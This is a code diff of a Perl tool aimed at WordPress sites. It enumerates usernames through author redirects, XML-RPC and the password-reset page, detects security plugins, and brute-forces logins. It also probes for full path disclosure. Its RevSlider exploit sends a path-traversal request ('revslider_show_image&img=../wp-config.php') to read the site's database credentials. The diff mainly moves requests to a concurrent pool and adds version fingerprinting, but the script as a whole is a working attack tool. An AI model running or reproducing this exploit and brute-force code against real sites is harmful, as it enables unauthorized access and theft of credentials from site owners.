@@ -1,38 +1,41 @@
 #!/usr/bin/perl
+use lib qw(lib);
 
 use 5.10.0;
 
 use strict;
 use warnings;
 
-use LWP::UserAgent;
+no warnings 'experimental';
+
 use HTTP::Request;
 use HTTP::Response;
-use HTTP::Cookies;
 use URI::URL;
 use Data::Dump qw(dump);
 use Term::ANSIColor qw(color colored);
 use Getopt::Long;
-use Parallel::ForkManager;
 
-no warnings 'experimental';
-
+use lib::Requester;
+use lib::XCoro;
+use lib::XCoro::Coro::Watcher;
+use lib::XCoro::Coro::Pool;
 
 ### Global variables (for configuration/settings stuff)
 
 my $ARGUMENTS = {
-    url                   => 0,
-    timeout               => 15,
-    threads               => 50,
-    useragent             => 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
-    proxy                 => 0,
-    verbosity             => 0,
-    usernames_list        => 'data/usernames.lst',
-    passwords_list        => 'data/passwords.lst',
-    default_paths_list    => 'data/default_paths.lst',
-    plugins_version_files => 'data/plugins_version_files.txt',
-    themes_version_files  => 'data/themes_version_files.txt',
-    header_file           => 0,
+    url                        => 0,
+    timeout                    => 15,
+    threads                    => 50,
+    useragent                  => 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
+    proxy                      => 0,
+    verbosity                  => 0,
+    usernames_list             => 'data/usernames.lst',
+    passwords_list             => 'data/passwords.lst',
+    default_paths_list         => 'data/default_paths.lst',
+    plugins_version_files_list => 'data/plugins_version_files.txt',
+    themes_version_files_list  => 'data/themes_version_files.txt',
+    version_files_list         => 'data/version_files.txt',
+    header_file                => 0,
 };
 
 my $SCAN = {
@@ -52,7 +55,7 @@ my $PATHS = {
     plugins_directory => 'wp-content/plugins/',
 };
 
-my $pm = new Parallel::ForkManager(30);
+my $requester = lib::Requester->new();
 
 ### Call main
 main();
@@ -99,10 +102,12 @@ sub main {
         $WORDPRESS = wordpressUsers($WORDPRESS, 'ALL');
     }
     
-    # Full path disclosure tests
-    $WORDPRESS = checkFPD($WORDPRESS);
-    $WORDPRESS = backupFiles($WORDPRESS);
-    
+    # Exploitation tests
+    if($SCAN->{exploit}) {
+        info("Starting exploitation tests on : " . $WORDPRESS->{url});
+        $WORDPRESS = checkFPD($WORDPRESS);
+        $WORDPRESS = backupFiles($WORDPRESS);
+    }
     
     # Bruteforce credentials
     if($SCAN->{bruteforce}) {
@@ -114,44 +119,37 @@ sub main {
 sub initialize {
     # Get command line arguments/options
     GetOptions(
-        "tm|timeout=i"    => \$ARGUMENTS->{timeout},
-        "t|threads=i"     => \$ARGUMENTS->{threads},
-        "u|url=s"         => \$ARGUMENTS->{url},
-        "proxy=s"         => \$ARGUMENTS->{proxy},
-        "ua|useragent=s"  => \$ARGUMENTS->{useragent},
-        "v|verbose!"      => \$ARGUMENTS->{verbosity},
+        "tm|timeout=i"     => \$ARGUMENTS->{timeout},
+        "t|threads=i"      => \$ARGUMENTS->{threads},
+        "u|url=s"          => \$ARGUMENTS->{url},
+        "proxy=s"          => \$ARGUMENTS->{proxy},
+        "ua|useragent=s"   => \$ARGUMENTS->{useragent},
+        "v|verbose!"       => \$ARGUMENTS->{verbosity},
     
-        "sv|version"      => \$SCAN->{version},
-        "wf|waf"          => \$SCAN->{waf},
-        "su|users"        => \$SCAN->{users},
-        "bf|bruteforce"   => \$SCAN->{bruteforce},
-        "ex|exploit"      => \$SCAN->{exploit},
+        "sv|version!"      => \$SCAN->{version},
+        "wf|waf!"          => \$SCAN->{waf},
+        "su|users!"        => \$SCAN->{users},
+        "bf|bruteforce!"   => \$SCAN->{bruteforce},
+        "ex|exploit!"      => \$SCAN->{exploit},
     
         "h|help"          => \&help,
     ) or die error("Bad value(s) provided in command line arguments .");
     
     die error("Arguments missing. Please specify at least a wordpress installation url.\n") if(!$ARGUMENTS->{url});
     
-    $SCAN->{browser} = initializeBrowser();
+    $requester->{browser} = initializeBrowser();
 }
 
 sub initializeBrowser {
-    my $browser = LWP::UserAgent->new();
-    
-    my $cookie_jar = HTTP::Cookies->new(
-        file     => "/tmp/cookies.lwp",
-        autosave => 1,
-    );
-    
-    $browser->agent($ARGUMENTS->{useragent});
-    $browser->timeout($ARGUMENTS->{timeout});
-    $browser->protocols_allowed([qw( ftp ftps http https )]);
+
+    $requester->{browser}->agent($ARGUMENTS->{useragent});
+    $requester->{browser}->timeout($ARGUMENTS->{timeout});
     
     if($ARGUMENTS->{proxy} && $ARGUMENTS->{proxy} =~ /^(https?|socks):\/\/[^:]+:[0-9]+$/i) {
-        $browser->proxy([qw/ ftp ftps http https /] => $ARGUMENTS->{proxy});
+        $requester->{browser}->proxy([qw/ ftp ftps http https /] => $ARGUMENTS->{proxy});
     }
     
-    return $browser;
+    return $requester->{browser};
 }
 
 ######################################## WordPress Informations ########################################
@@ -159,7 +157,7 @@ sub initializeBrowser {
 sub checkWordpressUrl {
     my ( $url ) = @_;
     my $request = HTTP::Request->new('GET', $url);
-    my $response = $SCAN->{browser}->request($request);
+    my $response = $requester->{browser}->request($request);
     
     my @matches = ();
     
@@ -185,7 +183,7 @@ sub checkWordpressUrl {
         $WORDPRESS = extractSpecialUrls($WORDPRESS, $response->content);
         $WORDPRESS = txtRobots($WORDPRESS);
         
-        my $login_page_response = $SCAN->{browser}->get($url . $PATHS->{login_page});
+        my $login_page_response = $requester->{browser}->get($url . $PATHS->{login_page});
         
         if($login_page_response =~ /[123][0-9][0-9]|403/) {
             $WORDPRESS->{login_page} = $login_page_response->request->uri;
@@ -200,7 +198,7 @@ sub checkWordpressUrl {
                 warning("Any WordPress generators found .");
                 info("Requesting content directory : " . $url . $PATHS->{content_directory});
                 
-                $response = $SCAN->{browser}->get($url . $PATHS->{content_directory});
+                $response = $requester->{browser}->get($url . $PATHS->{content_directory});
                 if($response->code =~ /2[0-9][0-9]|301|403/) {
                     $WORDPRESS->{valid} = 1;
                 } else {
@@ -296,7 +294,7 @@ sub txtRobots {
     my ( $WORDPRESS ) = @_;
     my $uri = new URI::URL $WORDPRESS->{url};
     my $request = HTTP::Request->new('GET', $WORDPRESS->{url} . 'robots.txt');
-    my $response = $SCAN->{browser}->request($request);
+    my $response = $requester->{browser}->request($request);
     
     if($response->is_success) {
         result("TXT Robots (robots.txt) Found : " , $response->request->uri);
@@ -434,12 +432,15 @@ sub wordpressVersion {
     my ( $WORDPRESS ) = @_;
     
     my @requests = ();
-    my @paths = read_file($ARGUMENTS->{default_paths_list}, 1);
-    my @regexes = [
-        qr/Version\s*(\d+\.[\d\.]*)/i,
-        qr/version="(\d[\.\d]*)">WORDPRESS</i,
-        qr/WORDPRESS (\d[\.\d]*)/i,
-    ];
+    my @paths = read_file($ARGUMENTS->{version_files_list}, 1);
+    my @regexes = (
+        qr/<br\s?\/>\sversion (\d[\d\.]*)/i,
+        qr/generator="wordpress\/(\d[\d\.]*)/i,
+        qr/name="generator"\s*content="wordpress (\d[\d\.]*).*?"/i,
+        qr/<generator>https:\/\/wordpress.org\/\?v=(\d[\d\.]*)<\/generator>/i,
+        qr/<admin:generatorAgent rdf:resource="http:\/\/wordpress.org\/\?v=(\d[\d\.]*)"/i,
+        qr/<generator uri="https?:\/\/wordpress.org\/"\s*version="(\d[\d\.]*)">WordPress/i,
+    );
     
     foreach my $path (@paths) {
         push(@requests, HTTP::Request->new('GET', $WORDPRESS->{url} . $path));
@@ -448,11 +449,13 @@ sub wordpressVersion {
     
     foreach my $response (@responses) {
         if($response->is_success) {
+            result("WordPress version URL found : " . $response->request->uri);
             foreach my $regex (@regexes) {
                 if($response->content =~ /$regex/i) {
                     my ($version) = $response->content =~ /$regex/i;
                     $WORDPRESS->{version} = $version;
-
+                    
+                    
                     return $WORDPRESS;
                 }
             }
@@ -493,16 +496,21 @@ sub extractComponents {
     my ( $WORDPRESS, $source ) = @_;
     $source =~ s/\\\//\//gi;
     my @matches = $source =~ m/(\/wp-content[\\]?\/(?:themes|plugins)[\\]?\/[^\/'"]*\/[^"'>< ]*)/sgi;
-
+    my @themes_paths = read_file($ARGUMENTS->{themes_version_files_list}, 1);
+    my @plugins_paths = read_file($ARGUMENTS->{plugins_version_files_list}, 1);
+     
     foreach my $match (@matches) {
         my $path = $match;
         my ($component_type, $component_name, $component_path) = $path =~ /\/wp-content[\\]?\/(themes|plugins)[\\]?\/([^\/'"]*)(\/[^"'\)>< ]*)/i;
         
+        my @requests = ();
+        
         if(!defined($WORDPRESS->{lc($component_type)}->{$component_name})) {
-            print color("bold green"), "\t[+] " . color("blue") . "WordPress " . color("cyan") . substr(ucfirst($component_type), 0, -1) . color("blue") . " Found : " . color("red") . $component_name . "\n\n";
-            
             $WORDPRESS->{lc($component_type)}->{$component_name}->{name} = $component_name;
             $WORDPRESS->{lc($component_type)}->{$component_name}->{url} = $WORDPRESS->{url} . 'wp-content/' . $component_type . '/' . $component_name . '/';
+            
+            print color("green"), "\t\t[+] " . color("blue") . "WordPress " . substr(ucfirst($component_type), 0, -1) . " found : " . color("yellow") . $component_name . "\n";
+            print color('cyan') . "\t\t    ---> " . color("white") . $WORDPRESS->{lc($component_type)}->{$component_name}->{url} . "\n\n";
             
             if(!defined($WORDPRESS->{lc($component_type)}->{$component_name}->{version})) {
                 
@@ -513,15 +521,41 @@ sub extractComponents {
                 given(lc($component_type))
                 {
                     when(/themes/i) {
-                        @paths = read_file($WORDPRESS->{themess_version_files}, );
+                        @paths = @themes_paths;
                         
                     }
                     
                     when(/plugins/i) {
-                        @paths = read_file(data/plugins_version_files);
+                        @paths = @plugins_paths;
                     }
                 }
-                my $request = HTTP::Request->new('GET', $WORDPRESS->{lc($component_type)}->{$component_name}->{url} . '/readme.txt');
+                
+                foreach my $path (@paths) {
+                    my $request = HTTP::Request->new('GET', $WORDPRESS->{lc($component_type)}->{$component_name}->{url} . $path);
+                    push(@requests, $request);
+                }
+                
+                my @responses = asyncRequests(@requests);
+                
+                foreach my $response (@responses) {
+                    if($response->is_success) {
+                        my $version = 0;
+                        
+                        result("Versioning URL found : " . color("yellow") . $response->request->uri);
+                        if($response->content =~ /[=]+\s+(?:v(?:er)?(?:sion)?\s*)?[0-9\.\-]+[ \ta-z0-9\(\)\.-]*[=]+/i) {
+                            ($version) = $response->content =~ /[=]+\s+(?:v(?:er)?(:sion)?\s*)?([0-9\.\-]+)[ \ta-z0-9\(\)\.-]*[=]+/i;
+                        } elsif($response->content =~ /\b(?:stable tag|version):\s*(?!trunk)[0-9a-z\.\-]+/i) {
+                            ($version) = $response->content =~ /\b(?:stable tag|version):\s*(?!trunk)([0-9a-z\.\-]+)/i;
+                        } elsif($response->content =~ /\d+[\d\.]*\s*-\s*2[0-9][0-9][0-9]/i) {
+                            ($version) = $response->content =~ /(\d+[\d\.]*)?\s*-\s*2[0-9][0-9][0-9]/i;
+                        }
+                        
+                        if($version) {
+                            $WORDPRESS->{lc($component_type)}->{$component_name}->{version} = $version;
+                            result("WordPress component " . color("red") . $component_name . color("blue") . " version found " . color("yellow") . $version);
+                        }
+                    }
+                }
                 
             }
             
@@ -540,12 +574,12 @@ sub getAuthorsUsers {
         my $username = 0;
         $response = $response->previous if($response->previous);
         
-        if($response->header('Location') && $response->header('Location') =~ /\/author\/.*\/?/) {
-            ($username) = $response->header('Location') =~ /\/author\/([^\/]*)\/?/;
+        if($response->header('Location') && $response->header('Location') =~ /author\/.*/i) {
+            ($username) = $response->header('Location') =~ /author\/([^\/]*)[\/]?/i;
         }
         
         if($username) {
-            result("WordPress User Found : " . color("yellow") . $username);
+            result("WordPress username found : " . color("yellow") . $username);
             $WORDPRESS->{users}->{$username}->{username} = $username;
         }
     }
@@ -561,8 +595,8 @@ sub getForgetPasswordUsers {
     foreach my $response (@responses) {
         my $username = 0;
         
-        if($response->content =~ /author-([^\s]*)\s*author/i) {
-            ($username) = $response->content =~ / author-([^\s]*)\s*author/i;
+        if($response->content =~ /author-([^\s]*)\sauthor/i) {
+            ($username) = $response->content =~ /author-([^\s]*)\sauthor/i;
             
             if($username) {
                 result("WordPress User Found : " . color("yellow") . $username);
@@ -594,7 +628,7 @@ sub getXMLRPCUsers {
                 ($WORDPRESS->{users}->{$username}->{name}) = $response->content =~ /"name":"([^"]*)"/i if($response->content =~ /"name":"/i);
             
                 if($WORDPRESS->{users}->{$username}->{username}) {
-                    result("WordPress User Found : " . color("yellow") . $WORDPRESS->{users}->{$username}->{username});
+                    result("WordPress username found : " . color("yellow") . $WORDPRESS->{users}->{$username}->{username});
                 }
             }
         }
@@ -647,10 +681,10 @@ sub getWAFPlugins {
     
     foreach my $waf_type (keys %{ $WAF }) {
         my $request = HTTP::Request->new('GET', $WORDPRESS->{url} . $WAF->{$waf_type}->{path});
-        my $response = $SCAN->{browser}->request($request);
+        my $response = $requester->{browser}->request($request);
         
         if($response->is_success) {
-            warning("WordPress WAF Plugin [" . color("red") . $WAF->{$waf_type}->{name} . color("blue") . "] Detected : " . color("yellow") . $WORDPRESS->{url} . $WAF->{$waf_type}->{path});
+            warning("wordPress WAF plugin [" . color("red") . $WAF->{$waf_type}->{name} . color("blue") . "] detected : " . color("yellow") . $WORDPRESS->{url} . $WAF->{$waf_type}->{path});
             $WORDPRESS->{WAF}->{$WAF->{$waf_type}->{name}} = $WORDPRESS->{url} . $WAF->{$waf_type}->{path};
         }
     }
@@ -670,8 +704,7 @@ sub loginBruteforce {
     my @responses = ();
     
     if(keys %{ $WORDPRESS->{users} }) {
-        foreach my $user_id (keys %{ $WORDPRESS->{users} }) {
-            my $username = $WORDPRESS->{users}->{$user_id}->{username};
+        foreach my $username (keys %{ $WORDPRESS->{users} }) {
             push(@usernames, $username);
         }
     } else {
@@ -727,12 +760,15 @@ sub checkFPD {
     my @urls = ('wp-includes/rss-functions.php');
     
     foreach my $url (@urls) {
-        my $response = $SCAN->{browser}->get($url);
+        my $request = HTTP::Request->new('GET', $url);
+        my $response = $requester->{browser}->request($request);
         
         if($response->is_success) {
             if($response->content =~ /Fatal Error[:\s]*/i) {
                 ($webroot_path) = $response->content =~ /Fatal Error[:\s]+(.+?)/i;
-                result("WordPress Web ROOT Path found : " . $response->request->uri);
+                $WORDPRESS->{webroot_path} = $webroot_path;
+                
+                result("WordPress Webroot path found : " . $response->request->uri);
             }
         }
     }
@@ -745,7 +781,7 @@ sub revsliderExploit {
     my $exploit_path = 'wp-admin/admin-ajax.php?action=revslider_show_image&img=';
     my $inclusion_path = '../wp-config.php';
                 
-    my @paths = [
+    my @paths = (
         'wp-content/themes/beach_apollo/',
         'wp-content/themes/striking_r/',
         'wp-content/themes/Centum/',
@@ -754,10 +790,11 @@ sub revsliderExploit {
         'wp-content/themes/ultimatum/',
         'wp-content/themes/IncredibleWP/',
         'wp-content/themes/cuckootap/',
-    ];
+    );
     
     foreach my $path (@paths) {
-        my $response = $SCAN->{browser}->request(HTTP::Request->new('GET', $WORDPRESS->{url} . $path));
+        my $request = HTTP::Request->new('GET', $WORDPRESS->{url} . $path);
+        my $response = $requester->{browser}->request($request);
         
         if($response->code =~ /[123][0-9][0-9]|403/i) {
             result("RevSlider vulnerable theme found : " . $WORDPRESS->{url} . $path);
@@ -765,7 +802,7 @@ sub revsliderExploit {
             my $exploit_request = HTTP::Request->new('GET', $WORDPRESS->{url} . $exploit_path . $inclusion_path);
             info("Sending exploit request : " . $WORDPRESS->{url} . $exploit_path . $inclusion_path);
             
-            my $exploit_response = $SCAN->{browser}->request($exploit_request);
+            my $exploit_response = $requester->{browser}->request($exploit_request);
             
             
             if($exploit_response->is_success && $exploit_response->content =~ /'DB_HOST'/) {
@@ -773,9 +810,9 @@ sub revsliderExploit {
                 $WORDPRESS->{vulnerabilities}->{$exploit_response->request->uri}->{request} = $exploit_request;
                 $WORDPRESS->{vulnerabilities}->{$exploit_response->request->uri}->{response} = $exploit_response;
                 
-                print color("green"), "[+] " . color("cyan") . $exploit_response->request->uri . color("blue") . " is " . color("green") . "VULNERABLE\n"; 
+                print color("green"), "\t\t[+] " . color("cyan") . $exploit_response->request->uri . color("blue") . " is " . color("green") . "VULNERABLE\n"; 
             } else {
-                print color("red"), "[-] " . color("cyan") . $exploit_response->request->uri . color("blue") . " is " . color("red") . "NOT VULNERABLE\n"; 
+                print color("red"), "\t\t[-] " . color("cyan") . $exploit_response->request->uri . color("blue") . " is " . color("red") . "NOT VULNERABLE\n"; 
             }
         }
     }
@@ -787,15 +824,32 @@ sub revsliderExploit {
 
 sub asyncRequests {
     my ( @requests ) = @_;
+    my $watcher = new lib::XCoro::Coro::Watcher;
+    my $nb_threads = $ARGUMENTS->{threads};
+    
     my @responses = ();
     
-    foreach my $request (@requests) {
-        # Forks and returns the pid for the child:
-        
-        push(@responses, $SCAN->{browser}->request($request));
+    if(0+@requests <= $nb_threads) {
+        $nb_threads = 0+@requests;
     }
     
-
+    while(my @part = splice @requests, 0, $nb_threads) {
+        my $threads = new lib::XCoro::Coro::Pool(
+            debug => 0,
+            start_message => "",
+            end_message => "",
+            desc => $::,
+            timelimit   => $ARGUMENTS->{timeout},
+            limit       => 150,
+            parent => $requester,
+            params  => \@part,
+            function => "processRequest",
+        );
+        $threads->start_all;
+        push(@responses, $threads->join_all);
+        undef $threads;
+    }
+    
     return @responses;
 }
 
@@ -825,7 +879,7 @@ sub read_file {
 
 sub info {
     my ( $text ) = @_;
-    print color("blue") . '✠' . color("blue") . " INFO" . color("white") . ": " . color("cyan") . " $text\n";
+    print colored("\t[INFO] ", "blue") . color("white") . "✠ " . color("cyan") . " $text\n";
 }
 
 sub warning {
@@ -835,7 +889,7 @@ sub warning {
 
 sub result {
     my ( $text ) = @_;
-    print color("green") . '✠' . color("blue") . " INFO" . color("white") . ": " . color("cyan") . " $text\n";
+    print color("green") . "\t\t[+] " . color("blue") . " $text\n";
 }
 
 sub error {
@@ -847,18 +901,24 @@ sub error {
 ######################################## Help Menu ########################################
 
 sub help {
-    print "\n";
-    print qq {
+    print color('bold black'), "\n";
+    print qq{
         
         ✠ 𝔲𝔰𝔞𝔤𝔢
         ------
-
+    };
+    print color('blue'), "\n";
+    print qq{
             perl $0  --url URL [OPTIONS]
         
-
+    };
+    print color('red'), "\n";
+    print qq{
         ✠ 𝔞𝔯𝔤𝔲𝔪𝔢𝔫𝔱𝔰
         ----------
-        
+    };
+    print color('blue'), "\n";
+    print qq{
          -u,--url [VALUE]         :  The target URL [Format: scheme://host]
         -tm,--timeout [VALUE]     :  Max timeout for the HTTP requests
          -t,--threads [VALUE]     :  Number of threads to use (Max: 30)
@@ -866,11 +926,14 @@ sub help {
         --useragent [VALUE]       :  Useragent to send to server
         --proxy [VALUE]           :  Proxy server to use [Format: scheme://host:port]
         --help                    :  Display the help menu
-        
-        
+    };
+    print color('yellow'), "\n";
+    print qq{
         ✠ 𝔰𝔠𝔞𝔫 𝔪𝔬𝔡𝔢𝔰
         -----------
-        
+    };
+    print color('blue'), "\n";
+    print qq{
         -sv,--version             :  Search Version
         -wf,--waf                 :  Detect WAF plugins
         -su,--users               :  Extract ussernames
